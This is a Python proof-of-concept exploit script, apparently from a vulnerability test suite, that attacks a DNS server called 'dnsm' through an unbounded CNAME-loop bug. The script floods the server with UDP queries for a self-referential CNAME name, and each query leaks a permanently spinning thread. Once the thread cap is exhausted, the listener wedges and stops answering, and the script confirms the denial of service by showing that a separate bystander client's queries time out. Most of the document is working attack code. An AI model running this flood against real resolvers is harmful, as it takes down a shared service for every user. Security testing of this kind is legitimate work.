#!/usr/bin/env python3
"""
PoC #6: Unbounded CNAME-chain following -> mass thread/CPU exhaustion
-------------------------------------------------------------------------
Bug: collect() in dnsm.c follows CNAME records during resolution with NO depth
limit and NO visited-name set. The sample zone contains a self-referential
chain (loop1 -> loop2 -> loop1). An A/AAAA/MX query for a name in that cycle
sends collect() around the loop forever - a tight, syscall-free, 100%-CPU busy
loop with no sleep and no I/O wait. udp_server() hands each datagram to its own
brand-new DETACHED thread with NO cap on how many can be in flight, so every
such query leaks one permanently-spinning thread that is never reclaimed.

WHY A SINGLE LOOPING QUERY IS *NOT* A SHARED-SERVICE DoS (and why this PoC does
NOT confirm from the attacking query's own fate). The per-datagram thread
isolation is deliberate (see the comment in udp_server()): one hung/looping
request spins its own thread and the listener keeps serving everyone else. So
"my loop1 query never got a reply / hung" proves only that ONE request suffered
- it does NOT prove denial of service. Confirmation therefore has to come from
a SEPARATE, ordinary client: does an unrelated name that resolves instantly on
a healthy server (www.example.com, a plain A record, no CNAME) still get
answered while the attack is running? Only its failure proves the shared
service is down.

WHY IT NEEDS VOLUME. One spinning thread pins one core but the scheduler still
time-slices the listener in, so a lone loop query barely dents bystander
latency. The kill is mass exhaustion: keep firing loop queries and the leaked
spinners pile up until they hit the container's pid/thread cap (pids_limit in
vuln_tests/docker-compose.yml). At that point pthread_create() in udp_server()
starts FAILING, and its fallback runs udp_worker() INLINE on the single
listener thread - so the very next evil datagram wedges the listener itself in
the infinite loop and the whole UDP service stops answering ANY client. That is
the shared-service DoS the scoring contract asks for; a single isolated hang is
not. This PoC drives enough volume to cross that cap and then proves the
outcome by bystander denial.

CONFIRMATION IS BY LIVENESS / BYSTANDER DENIAL, NOT BY A LATENCY RATIO ON
SUB-MILLISECOND NUMBERS. We (1) baseline an ordinary bystander query and require
the server to be healthy; (2) fire loop queries in escalating bursts, re-probing
the bystander between bursts, until the bystander is actually DENIED (its
queries to an instantly-resolvable name start timing out) or we exhaust our
budget. We pass ONLY if a separate normal client is denied service; a merely
"slower but still answered" bystander is reported as NOT a full DoS (exit 1) -
that would mean the loop was capped (depth/visited guard) or the thread budget
was never exhausted.

NOTE: this must be exercised against a dnsm built from the CURRENT source. An
older/stale image that caps the CNAME chain answers loop queries instantly and
spins no threads; against such a build this PoC correctly reports NOT a full DoS
rather than false-passing. Use `run --build` (see vuln_tests/README.md) so the
dnsm image matches the source under test.

WARNING: on success this genuinely takes the service down and leaves hundreds of
permanently-spinning threads behind - restart the dnsm container afterwards.

Run the server first, then:
    python3 06_cname_chain_dos.py [host] [port] [flood_budget]
"""
import os
import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8053

# Total loop-query budget. It must comfortably exceed the server's worker/thread
# cap (vuln_tests/docker-compose.yml sets pids_limit 200) so the leaked spinners
# actually exhaust it and wedge the listener. UDP drops mean not every datagram
# spawns a thread, so we send well past the cap, in escalating bursts.
_DEFAULT_BUDGET = 1200
BUDGET = int(sys.argv[3]) if len(sys.argv) > 3 else _DEFAULT_BUDGET

BURST = 80                 # loop queries per escalation round
SAMPLES = 5                # bystander probes per measurement (see early-exit below)
BYSTANDER = "www.example.com"   # plain A record, resolves instantly on a healthy server
# A healthy A answer comes back in well under a millisecond, so 1s is a generous
# margin even on limited hardware. This is the dominant cost when the service is
# wedged (every sample times out), so it is kept tight and paired with the
# early-exit in probe_bystander() below — the old 3s x 8 samples made a single
# "denied" measurement cost ~24s and blew the per-PoC budget.
PROBE_TIMEOUT = 1.0
# The bystander counts as DENIED when at least this fraction of its probes time
# out. Baseline requires ~zero failures, so any sustained majority of timeouts
# is a real transition from "served" to "denied", not jitter.
DENY_FRACTION = 0.5


def dns_name(n):
    return b"".join(bytes([len(l)]) + l.encode() for l in n.split(".") if l) + b"\x00"


def build_query(name, qtype, txid):
    return struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0) + dns_name(name) + struct.pack(">HH", qtype, 1)


def timed_query(name, qtype, txid, timeout):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.sendto(build_query(name, qtype, txid), (HOST, PORT))
        s.recvfrom(8192)
        return time.time() - t0
    except socket.timeout:
        return None
    finally:
        s.close()


def _deny_threshold():
    return max(1, int(SAMPLES * DENY_FRACTION + 0.999))


def probe_bystander(tag):
    """Sample the ordinary bystander query. Return (fails, avg_latency_or_None).

    Short-circuits as soon as the verdict is decided: once enough samples have
    timed out to meet the deny threshold, or once enough have succeeded that the
    threshold can no longer be reached. This caps a 'denied' measurement at
    roughly deny_threshold * PROBE_TIMEOUT instead of SAMPLES * PROBE_TIMEOUT,
    which is what kept this PoC's confirming probe from taking ~24s."""
    need = _deny_threshold()
    lat, fails = [], 0
    for i in range(SAMPLES):
        dt = timed_query(BYSTANDER, 1, ((tag << 4) + i) & 0xFFFF, PROBE_TIMEOUT)
        if dt is None:
            fails += 1
        else:
            lat.append(dt)
        remaining = SAMPLES - (i + 1)
        if fails >= need or fails + remaining < need:
            break
    avg = (sum(lat) / len(lat)) if lat else None
    return fails, avg


def fire_burst(n, base_txid):
    """Fire n loop1 queries fire-and-forget (none ever get a reply)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(n):
        try:
            s.sendto(build_query("loop1.example.com", 1, 0x8000 + ((base_txid + i) % 0x7000)), (HOST, PORT))
        except OSError:
            pass
    s.close()


def denied(fails):
    return fails >= _deny_threshold()


def main():
    # 1) Baseline: the shared service must be healthy before we can claim we downed it.
    base_fails, base_avg = probe_bystander(0x100)
    if base_avg is None or denied(base_fails):
        print(f"[-] baseline: bystander {BYSTANDER} is already failing "
              f"({base_fails}/{SAMPLES} timeouts); is dnsm up and healthy? "
              "cannot run a DoS test against an already-down service")
        return 2
    print(f"[*] baseline: bystander {BYSTANDER} {SAMPLES - base_fails}/{SAMPLES} ok, "
          f"avg {base_avg*1000:.2f} ms")

    # 2) Escalating flood: keep leaking spinning CNAME-loop threads and re-probe a
    #    SEPARATE ordinary client between bursts, until that bystander is denied.
    print(f"[*] flooding loop1.example.com (loop1<->loop2 CNAME cycle) in bursts of "
          f"{BURST}, up to {BUDGET} total; each leaks one permanently-spinning "
          "detached thread server-side...")
    sent = 0
    while sent < BUDGET:
        fire_burst(BURST, sent)
        sent += BURST
        # Let the freshly spawned workers get scheduled and start spinning, and let
        # the listener drain its receive queue so the next burst isn't just dropped.
        time.sleep(0.5)
        fails, avg = probe_bystander(0x2000 + sent)
        shown = f"{avg*1000:.1f} ms" if avg is not None else "ALL TIMEOUT"
        print(f"[*]   after {sent} loop queries: bystander {SAMPLES - fails}/{SAMPLES} ok, "
              f"avg {shown}")
        if denied(fails):
            ratio = f"{avg/base_avg:.0f}x baseline" if avg else "total unavailability"
            print(f"[+] mass-exhaustion DoS confirmed: after leaking ~{sent} spinning "
                  f"CNAME-loop threads, a SEPARATE ordinary client's queries for "
                  f"{BYSTANDER} (a plain A record) are denied - {fails}/{SAMPLES} time "
                  f"out (was {base_fails}/{SAMPLES} at {base_avg*1000:.2f} ms; "
                  f"{ratio}). The thread budget is exhausted and the listener is "
                  "wedged: this is a shared-service outage for every client, not a "
                  "single isolated hang. (Restart the dnsm container before the next "
                  "PoC.)")
            return 0

    # 3) Budget spent, bystander still served: the loop was capped or the thread
    #    budget was never exhausted. Do NOT claim a DoS off the attacker's own hung
    #    queries - a slower-but-answered bystander is not denial of service.
    fails, avg = probe_bystander(0x3000)
    shown = f"{avg*1000:.1f} ms" if avg is not None else "ALL TIMEOUT"
    if denied(fails):
        print(f"[+] mass-exhaustion DoS confirmed on final probe: bystander "
              f"{fails}/{SAMPLES} timeouts ({shown}). Restart dnsm before the next PoC.")
        return 0
    print(f"[-] not a full DoS: after {sent} loop queries the bystander {BYSTANDER} is "
          f"still served ({SAMPLES - fails}/{SAMPLES} ok, {shown}). The CNAME loop "
          "may be capped (depth/visited guard in collect()), or the thread budget was "
          "never exhausted - try a larger flood_budget, or confirm dnsm was built "
          "from the current source (a stale/capped image answers loop queries "
          "instantly and spins no threads).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
